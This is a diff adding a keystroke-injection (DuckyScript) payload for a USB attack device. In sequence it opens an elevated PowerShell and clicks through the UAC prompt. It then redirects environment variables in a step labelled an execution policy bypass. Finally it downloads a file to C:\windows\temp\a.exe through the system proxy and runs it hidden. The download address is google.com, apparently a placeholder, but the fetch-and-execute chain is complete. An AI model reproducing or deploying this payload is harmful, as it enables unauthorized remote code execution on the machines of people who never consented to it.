@@ -1,0 +1,18 @@
+DELAY 200
+GUI r
+DELAY 200
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 4000
+LEFT
+ENTER
+
+DELAY 3000
+REM execution policy bypass
+STRING $a=$env:temp;$b=$env:tmp;$t="C:\windows\temp";$s="C:\windows\temp";Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$t";Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$s";Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "powershell";Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $b;Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $a;exit;
+ENTER
+
+DELAY 3000
+REM execute file
+STRING $ex=(Join-Path -Path "C:\windows\temp" -ChildPath "a.exe");$p=[System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$c=New-Object Net.WebClient;$c.Proxy=$p;$c.DownloadFile("https://www.google.com", $ex);Start-Process -FilePath $ex -WindowStyle Hidden;exit;
+ENTER
